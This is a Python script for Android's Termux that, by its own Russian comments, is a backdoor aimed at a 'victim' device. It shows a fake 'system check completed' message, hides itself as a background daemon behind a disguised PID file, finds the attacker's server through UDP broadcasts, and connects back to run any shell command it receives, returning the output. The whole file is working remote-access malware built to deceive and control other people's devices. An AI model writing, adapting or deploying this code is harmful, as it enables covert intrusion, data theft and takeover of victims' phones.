
#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time
import atexit
import signal

# Скрываем процесс от пользователя
def hide_process():
    """Скрываем процесс и работаем в фоне"""
    try:
        # Первый fork - создаем демона
        pid = os.fork()
        if pid > 0:
            # Родительский процесс завершается
            sys.exit(0)
    except OSError as e:
        sys.exit(1)

    # Создаем новую сессию
    os.setsid()
    os.umask(0)

    # Второй fork
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)

    # Перенаправляем стандартные потоки в /dev/null
    sys.stdout.flush()
    sys.stderr.flush()

    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

    # Удаляем PID файл при выходе
    def cleanup():
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except:
            pass

    atexit.register(cleanup)

    # Записываем PID в файл
    try:
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

# PID файл для отслеживания
pid_file = "/data/data/com.termux/files/usr/tmp/.termux_system"

def check_already_running():
    """Проверяем, не запущен ли уже процесс"""
    if os.path.exists(pid_file):
        try:
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())

            # Проверяем, жив ли процесс
            os.kill(old_pid, 0)
            return True
        except (OSError, ValueError):
            # Процесс умер или файл поврежден
            try:
                os.remove(pid_file)
            except:
                pass
    return False

def discover_server():
    """Ищем сервер злоумышленника в локальной сети"""
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_socket.settimeout(5)  # Уменьшаем таймаут для быстрого поиска

    try:
        listen_socket.bind(('', 7157))

        for i in range(10):  # Ищем 10 раз
            try:
                data, addr = listen_socket.recvfrom(1024)
                message = data.decode()

                if message.startswith("RTernux:"):
                    parts = message.split(":")
                    if len(parts) >= 3:
                        server_ip = parts[2]
                        server_port = int(parts[1])
                        listen_socket.close()
                        return server_ip, server_port

            except socket.timeout:
                continue

    except Exception:
        pass

    listen_socket.close()
    return None, None

def connect_to_server(server_ip, server_port=7156):
    """Подключаемся к серверу"""
    for attempt in range(1, 4):  # 3 попытки
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((server_ip, server_port))

            # Получаем приветствие
            sock.recv(1024)
            return sock

        except (ConnectionRefusedError, socket.timeout, Exception):
            time.sleep(3)

    return None

def execute_command(command):
    """Выполняем команду на устройстве жертвы"""
    try:
        # Обработка cd
        if command.strip().startswith('cd '):
            path = command.strip()[3:].strip()
            if not path:
                path = os.path.expanduser("~")
            try:
                os.chdir(path)
                return f"Текущая директория: {os.getcwd()}\n__END__"
            except Exception as e:
                return f"Ошибка: {e}\n__END__"

        # Выполняем команду
        try:
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                cwd=os.getcwd(),
                timeout=30
            )

            result = process.stdout
            if process.stderr:
                if result:
                    result += f"\nОшибка: {process.stderr}"
                else:
                    result = f"Ошибка: {process.stderr}"

            if not result:
                result = "✅ Команда выполнена"

            return result + "\n__END__"

        except subprocess.TimeoutExpired:
            return "❌ Таймаут (30 секунд)\n__END__"
        except Exception as e:
            return f"❌ Ошибка выполнения: {str(e)}\n__END__"

    except Exception as e:
        return f"❌ Общая ошибка: {str(e)}\n__END__"

def main_loop():
    """Основной цикл работы жертвы"""
    while True:
        try:
            # Ищем сервер
            server_ip, server_port = discover_server()

            if not server_ip:
                # Ждем 10 секунд перед следующей попыткой
                time.sleep(10)
                continue

            # Подключаемся
            sock = connect_to_server(server_ip, server_port)

            if not sock:
                time.sleep(10)
                continue

            # Основной цикл обработки команд
            while True:
                try:
                    sock.settimeout(1)

                    try:
                        data = sock.recv(4096)
                    except socket.timeout:
                        # Проверяем соединение
                        try:
                            sock.send(b"ping\n")
                        except:
                            break
                        continue

                    if not data:
                        break

                    command = data.decode().strip()

                    if command.lower() == 'exit':
                        sock.send("Сессия завершена\n__END__".encode())
                        break

                    if command.lower() == 'ping':
                        sock.send("pong\n__END__".encode())
                        continue

                    result = execute_command(command)
                    sock.send(result.encode())

                except (ConnectionResetError, BrokenPipeError):
                    break
                except Exception:
                    continue

        except KeyboardInterrupt:
            break
        except Exception:
            # При любой ошибке ждем и переподключаемся
            time.sleep(30)
            continue

def main():
    """Точка входа"""
    # Проверяем, не запущен ли уже процесс
    if check_already_running():
        sys.exit(0)

    # Показываем приветствие и сразу скрываемся
    print("Запуск системной проверки...")
    print("Проверка завершена успешно.")
    time.sleep(2)

    # Скрываем процесс
    hide_process()

    # Создаем файл-маркер запуска
    try:
        marker_file = os.path.expanduser("~/.system_check_done")
        with open(marker_file, 'w') as f:
            f.write("system check completed at " + time.strftime("%Y-%m-%d %H:%M:%S"))
    except:
        pass

    # Запускаем основной цикл
    main_loop()

if __name__ == "__main__":
    main()
